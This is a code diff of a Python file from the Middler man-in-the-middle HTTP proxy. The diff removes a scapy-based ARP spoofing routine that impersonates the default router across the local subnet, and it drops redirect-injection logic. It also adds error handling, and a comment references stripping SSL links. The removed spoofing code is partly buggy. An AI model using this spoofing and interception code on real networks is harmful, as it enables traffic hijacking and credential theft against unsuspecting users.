@@ -1,7 +1,5 @@
 #!/usr/bin/env python
 
-# Version 20090703
-
 import libmiddler as ml
 # Copyright 2009 Jay Beale
 # Licensed under GPL v2
@@ -11,12 +9,11 @@ from socket import *
 import os, signal, SocketServer, select, sys, Cookie
 import re, urllib,time
 import threading, thread
-from scapy import *
 
 #### Globals
 
 keep_gzip_in_requests = 0
-port = 0
+port = 80
 
 # Process ID's for any processes we fork
 child_pids_to_shutdown = []
@@ -25,147 +22,6 @@ toggle_arpspoof = False
 ####################################################################################################
 # Network interface code
 ####################################################################################################
-
-def find_my_default_router_and_interface():
-
-    # On Linux, get the router IP address out of /proc/net/route
-    #
-    # You just need to translate the IP address in the third (gateway) column of the line that has eight 0's
-    # (00000000) in its second (destination) column.
-
-    # Use netstat -rn to figure out what the operating system's default router is and what
-    # its Internet interface is.
-
-    (stdin,stdout) = os.popen2("netstat -rn","r",100)
-    for line in stdout:
-        # BSD and OS X
-        if line.startswith("default"):
-            fields = line.split()
-            router_interface = fields[5]
-            router_ip = fields[1]
-            break
-        elif line.startswith("0.0.0.0"):
-            fields = line.split()
-            router_interface = fields[7]
-            router_ip = fields[1]
-            break
-    stdin.close()
-    stdout.close()
-
-    return (router_interface,router_ip)
-
-####################################################################################################
-# ARP spoofing code
-####################################################################################################
-
-def arpspoof(impersonated_host, victim_ip, my_mac):
-    const_ARP_RESPONSE = 2
-
-    # define a constant for ARP responses
-    const_ARP_RESPONSE = const_ARP_RESPONSE
-
-    # Build an ARP response to set up spoofing
-    arp_response = ARP()
-    # Set the type to a ARP response
-    arp_response.op = 2
-    # Hardware address we want to claim the packet
-    arp_response.hwsrc = my_mac
-    # IP address we want to map to that address
-    arp_response.psrc = impersonated_host
-    # MAC address and IP address of our victim
-    arp_response.hwdst = victim_mac
-    arp_response.pdst = victim_ip
-    # Issue the ARP response
-    send(arp_response)
-
-def find_mac(interface):
-    # Run ifconfig for the named interface.
-    (outf,inf,errf)=popen2(" ".join("ifconfig ",interface))
-    # Just grab the line(s) that have a MAC address on them.
-    ether_lines = [ line for line in outf.readlines() if line.find("ether") >= 0 ]
-
-    # If there are not MAC address lines, we're busted.
-    if ether_lines == []:
-        # Warn the user that we can't arpspoof if there are no interfaces
-        ml.jjlog.debug( "    WARNING: cannot determine MAC address for interface %s " % interface)
-        ml.jjlog.debug( "    ARP spoofing deactivated.")
-        return("NONE")
-    else:
-        line = ether_lines.pop()
-        return(line)
-
-def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_host="defaultrouter"):
-    """This routine sets up ARP spoofing to get traffic on the local LAN to our
-    system.    It uses the arpspoof() routine above to actually construct and send
-    the packets."""
-
-    # We start by determining our own MAC address on the interface of choice and
-    # figuring out what our default gateway is.
-
-    # We may indeed be using a different interface, particularly if we're
-    # ARP spoofing on one interface and sending traffic out via a separate
-    # network connection.    Imagine a dual-homed host that isn't the normal
-    # router.    It could indeed start being the router!
-
-    # We need to know the router ip, so we know who to impersonate.
-
-    (router_interface,router_ip) = find_my_default_router_and_interface()
-
-    # If the user doesn't request a specific interface, we use their default
-    # interface.    If he doesn't request a specific target, we use his default
-    # router.
-
-    if (interface == "defaultroute"):
-        interface = router_interface
-    if (impersonated_host == "defaultrouter"):
-        impersonated_host = router_ip
-
-    # Now, let's set up to send ARP replies either to a specifically-named target
-    # or to everyone on the network except the default router.
-
-    my_mac = find_mac(interface)
-    if my_mac == "NONE":
-        exit(1)
-
-    # TODO-Med: Allow the user to submit a list of interfaces.
-    # TODO-High: Make this work on Windows.
-
-    # We'll fork this part off, so it can run for a long time without slowing
-    # everything else down.
-
-    pid = os.fork()
-
-    # For the parent...
-    if pid:
-        # Make sure we don't exit until this child exits
-        os.waitpid(pid,0)
-        child_pids_to_shutdown.append(pid)
-    # For the child...
-    else:
-        # Spoof away, Mr McManis
-
-
-        if target_host != "ALL":
-            while 1:
-                arpspoof(impersonated_host,target_host,my_mac )
-
-        # Eventually, let's use an nmap ARP or "list" scan to enumerate all IPs in
-        # the subnet.    For now, we'll assume a class C.
-        # As an intermediate move, we could look at the netmask.    On Linux, we can read
-        # this from /proc/net/route's 8th column, though the netmask is in hexadecimal.
-
-        # elif (os.path.exists(r'/usr/bin/nmap') or os.path.exists(r'/usr/local/bin/nmap')):
-        else:
-            while 1:
-                final_period_location = router_ip.rfind(".")
-                router_network = router_ip[:final_period_location]
-                final_period_location += 1
-                router_hostnum = router_ip[final_period_location:]
-                for host in xrange(1,255):
-                    if host != router_hostnum:
-                        targetip = ".".join(router_network,host)
-                        arpspoof(impersonated_host,target_host,my_mac)
-
 
 #
 # string &remove_ssl(text) takes a string and changes all of the https links into http links
@@ -635,8 +491,13 @@ class MiddlerHTTPProxy(SocketServer.StreamRequestHandler):
                 ml.jjlog.debug("Probably just finished reading request header")
 
             #### Handle Header-analysis
-            method, part2 = request_headers[0][1].split(' ',1)
-            url, HTTPprotocol = part2.rsplit(' ',1)
+            try:
+                method, part2 = request_headers[0][1].split(' ',1)
+                url, HTTPprotocol = part2.rsplit(' ',1)
+            except ValueError:
+                print ("ERROR: Failure condition while separating out the parts of request_headers[0][1] by spaces - header was:\n%s\n" % (request_headers[0][1]) )
+                exit(1)
+
             if method == "CONNECT":
                 #ml.jjlog.debug("Found a CONNECT method.    Changing to GET.\n")
                 method = "GET"
@@ -742,8 +603,8 @@ class MiddlerHTTPProxy(SocketServer.StreamRequestHandler):
                     ##modified_request = modified_request + line
                 index += 1
 
+            port = 80
             ml.jjlog.debug("%s is requesting %s:%s" % (self.client_address[0], desthostname, port))
-            ("%s is requesting %s:%s" % (self.client_address[0], desthostname, port))
 
             try:
                 if method == "POST":
@@ -770,27 +631,33 @@ class MiddlerHTTPProxy(SocketServer.StreamRequestHandler):
             # Open a connection to the desired server and send request
 
             try:
+                port = 80
                 ml.jjlog.debug("Connecting HTTP to: %s:%d\n" % (desthostname,port))
-                print("Connecting HTTP to: %s:%d\n" % (desthostname,port))
                 j=HTTPConnection("%s:%d" % (desthostname,port) )
                 j.putrequest(method,url,"skip_host")
-
+                #print "\n=========\nRequest going out:\n"
+                #print("Request as follows: %s %s\n" % (method,url))
     # Switch in the original headers.
+
                 for header in request_headers[1:]:
                     lvalue = header[0]
                     lvalue = lvalue.capitalize()
                     rvalue = header[1]
+                    #print ("%s: %s" % (lvalue,rvalue[0:-1]) )
                     j.putheader(lvalue,rvalue[0:-1])
                     #print "Just inserted header %s: %s" % ( header[0],rvalue[0:-1])
 
                 j.endheaders()
                 j.send(request_data)
+                #if request_data:
+                #  print ("\n%s\n" % request_data )
 
     # Now get a response and take the parsing for free!
                 response_object=j.getresponse()
 
             except:
                 ml.jjlog.debug("Connection failed to host %s\n" % desthostname)
+                self.finish()
                 break
 
                 #ml.jjlog.debug("Just sent modified request: \n%s" % modified_request)
@@ -802,22 +669,30 @@ class MiddlerHTTPProxy(SocketServer.StreamRequestHandler):
             # Parse the response
             modified_response=""
 
-
             # Now parse one line at a time
             content_type_is_image = 0
 
             http_version = "HTTP/%s.%s" % (str(response_object.version)[0],str(response_object.version)[1])
-            response_code_line = "%s %s %s" % (http_version,response_object.status,response_object.reason)
-            print "response_code_line is %s" % response_code_line
+            response_code_line = "%s %s %s" % (http_version,str(response_object.status),str(response_object.reason))
+            #print ("Got response code %s\n" % response_object.status)
+            #print ("Response code line is %s\n" % response_code_line)
+            ml.jjlog.debug("response_code_line is %s" % response_code_line)
 
             # We've set an initial value - overwrite this if necessary.
-            if IR.inject_redirect(desthostname) == 1:
-                response_headers = [ ( "Response", "HTTP/1.1 307 Temporary Redirect\n" + "Location: " + location_to_inject + "\n" ) ]
-            elif inject_status_code == 1:
-                response_headers = [ ( "Response", status_code_to_inject ) ]
-            else:
-                # Let's put the response code on top!
-                response_headers = [ "Response",response_code_line ]
+            #if inject_redirect(desthostname) == 1:
+            #    response_headers = [ ( "Response", "HTTP/1.1 307 Temporary Redirect\n" + "Location: " + location_to_inject + "\n" ) ]
+            #elif inject_status_code == 1:
+            #    response_headers = [ ( "Response", status_code_to_inject ) ]
+            #else:
+            #     #Let's put the response code on top!
+            #    response_headers = [ "Response",response_code_line ]
+
+
+            # Let's put the response code on top, allowing the plugins to see and modify
+            # the response code.
+
+            response_headers = []
+            response_headers.append( ["Response",response_code_line] )
 
             # Now add on the rest of the response headers.
             unordered_headers = response_object.getheaders()
@@ -829,13 +704,17 @@ class MiddlerHTTPProxy(SocketServer.StreamRequestHandler):
                     response_headers.append([header.capitalize(),value])
                 except:
                     print "Header parsing failing.\n"
-
-            #response_headers.append(response_object.getheaders())
+                    self.finish()
 
             # And store the data in the page.
             response_data = response_object.read()
-            print "response data is %s" % (response_data)
-            print("\nbefore plugin, response headers are %s\n\n" % response_headers)
+
+            # Temporary code for seeing if the difference in sites is the ret characters
+            firstret = response_data.find('\n')
+            if firstret >= 0 :
+                if response_data[firstret-1] == '\r':
+                    ml.jjlog.debug("For site %s, newlines included \\r!" % desthostname)
+
             ml.jjlog.debug("\nbefore plugin, response headers are %s\n\n" % response_headers)
             self.current_user, response_headers, response_data = self.doResponse(self.current_user, request_headers, response_headers, response_data)
             ml.jjlog.debug("after plugins, response headers are %s\n\n" % response_headers )
@@ -847,7 +726,11 @@ class MiddlerHTTPProxy(SocketServer.StreamRequestHandler):
 
             rets = "\n"
             #response_code_line = ( "%s%s" % (response_headers[0][1] , rets) )
-            modified_response_temp = [ response_code_line ]
+            modified_response_temp = []
+
+            # Remove the first item from response_headers, since it's our Response Code and reason
+            # psuedo-header.  We can make this the first line, but it needs to have only the rvalue.
+            modified_response_temp.append(response_headers.pop(0)[1])
 
             for header_idx in xrange(1,len(response_headers)):
                 modified_response_temp.append("%s: %s%s"% (response_headers[header_idx][0],response_headers[header_idx][1],rets))
@@ -878,6 +761,7 @@ class MiddlerHTTPProxy(SocketServer.StreamRequestHandler):
                 self.wfile.close()
             except:
                 self.wfile.close()
+                self.finish()
                 #self.wfile.close()
                 #self.rfile.close()
 
